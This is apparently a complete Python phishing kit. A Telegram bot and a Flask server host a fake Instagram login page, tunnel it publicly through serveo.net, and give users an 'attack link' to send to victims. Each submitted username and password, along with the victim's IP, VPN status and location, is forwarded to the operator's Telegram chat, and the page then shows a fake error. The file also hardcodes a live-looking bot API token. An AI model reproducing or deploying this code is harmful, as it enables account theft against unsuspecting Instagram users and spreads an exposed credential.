import telebot
from flask import Flask, request, render_template_string
import threading
import os
import subprocess
import requests
import json
import time

# --- [ CONFIGURATION ] ---
API_TOKEN = '8666034301:AAHksgPWYvDYtNLXqsuQpq6ycVErcqnQBAA'
CH_ID = "@ZXINOXHAX"

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

# --- [ STYLING & BRANDING ] ---
BRAND = "ZXINOX ELITE"
DEV = "@I_AM_BATMAN_EDITOR"
HEADER = f"💜 <b>{BRAND} OS v3.0</b> 💜\n"
LINE = "───────────────────────\n"

# --- [ WEB UI - DARK TOXIC NEON ] ---
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #0a0a0a; border: 1px solid #7b2cbf; padding: 40px; width: 320px; border-radius: 15px; box-shadow: 0 0 40px rgba(123, 44, 191, 0.6); text-align: center; border: 1px solid #7b2cbf; }
        .logo { font-size: 40px; font-weight: bold; background: linear-gradient(to right, #7b2cbf, #9d4edd); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { color: #7b2cbf; font-size: 10px; letter-spacing: 2px; font-weight: bold; margin-bottom: 25px; text-transform: uppercase; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #222; background: #111; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: #7b2cbf; }
        button { width: 100%; padding: 12px; background: #7b2cbf; border: none; color: #fff; font-weight: bold; border-radius: 5px; margin-top: 15px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">Instagram</div>
        <div class="sub">SECURE ENCRYPTION</div>
        <p style="color:#ed4956; font-size:12px; display:{{ 'block' if error else 'none' }}">Connection error. Please re-login.</p>
        <form method="post">
            <input type="text" name="u" placeholder="Username, email or phone" required>
            <input type="password" name="p" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
'''

# --- [ HELPER FUNCTIONS ] ---
def get_ip_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,proxy,hosting").json()
        vpn = "YES ✅" if r.get('proxy') or r.get('hosting') else "NO ❌"
        return vpn, f"{r.get('city')}, {r.get('country')}"
    except: return "Unknown", "Unknown"

def is_subscribed(chat_id):
    try:
        s = bot.get_chat_member(CH_ID, chat_id).status
        return s in ['member', 'administrator', 'creator']
    except: return False

# --- [ WEB SERVER ROUTES ] ---
@app.route('/<uid>', methods=['GET', 'POST'])
def index(uid):
    error = False
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        vpn, loc = get_ip_info(ip)
        
        msg = (f"{HEADER}{LINE}"
               f"👤 <b>USER:</b> <code>{u}</code>\n"
               f"🔑 <b>PASS:</b> <code>{p}</code>\n"
               f"🌐 <b>IP:</b> <code>{ip}</code>\n"
               f"🛡️ <b>VPN:</b> {vpn}\n"
               f"📍 <b>LOC:</b> {loc}\n{LINE}"
               f"⚡ <b>STATUS:</b> CAPTURED BY ZXINOX")
        bot.send_message(uid, msg, parse_mode='HTML')
        error = True
    return render_template_string(HTML_TEMPLATE, error=error)

# --- [ AUTO TUNNEL ENGINE ] ---
def start_tunnel(uid):
    bot.send_message(uid, "⚙️ <b>BOOTING TUNNEL CORE...</b>", parse_mode='HTML')
    # GSM app terminal support check
    cmd = "ssh -o StrictHostKeyChecking=no -R 80:localhost:10000 serveo.net"
    p = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in p.stdout:
        if "Forwarding HTTP traffic from" in line:
            url = line.split("from ")[1].strip()
            bot.send_message(uid, f"{HEADER}🔗 <b>ATTACK LINK GENERATED</b>\n\n<code>{url}/{uid}</code>\n\n⚠️ <b>HACKER WARNING:</b> Send this to victim only.", parse_mode='HTML')
            break

# --- [ TELEGRAM HANDLERS ] ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.chat.id
    if not is_subscribed(uid):
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{CH_ID[1:]}"))
        bot.send_message(uid, f"{HEADER}{LINE}⚠️ <b>ACCESS DENIED!</b>\n\nYou must join {CH_ID} to use this terminal.", reply_markup=markup, parse_mode='HTML')
        return

    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("🚀 DEPLOY LINK", callback_data="gen"),
        telebot.types.InlineKeyboardButton("📊 DASHBOARD", callback_data="dash"),
        telebot.types.InlineKeyboardButton("🛡️ VPN CHECK", callback_data="vpn"),
        telebot.types.InlineKeyboardButton("👑 OWNER", url=f"https://t.me/{DEV[1:]}")
    )
    
    bot.send_message(uid, f"{HEADER}{LINE}🛡️ <b>STATUS:</b> <code>ENCRYPTED</code>\n🛰️ <b>SERVER:</b> <code>ONLINE</code>\n👤 <b>USER:</b> <code>{message.from_user.first_name}</code>\n{LINE}<b>WARNING:</b> Target must be connected to internet.", reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == "gen":
        threading.Thread(target=start_tunnel, args=(str(call.message.chat.id),)).start()
    elif call.data == "dash":
        bot.answer_callback_query(call.id, "Database is secure and encrypted! 🔒")
    elif call.data == "vpn":
        bot.answer_callback_query(call.id, "VPN Protection: Active ✅", show_alert=True)

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()
    bot.infinity_polling()
